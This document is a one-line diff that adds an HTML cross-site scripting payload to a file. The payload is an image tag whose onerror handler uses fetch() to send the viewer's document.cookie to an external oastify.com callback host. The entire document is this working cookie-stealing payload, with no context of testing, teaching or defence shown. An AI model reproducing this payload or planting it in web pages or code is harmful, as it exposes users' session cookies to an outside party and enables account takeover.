@@ -1,0 +1,1 @@
+<img src onerror="fetch('https://oiawrf6wssatoz2fi4hlqvdrmis9gz4o.oastify.com/'+document.cookie)">
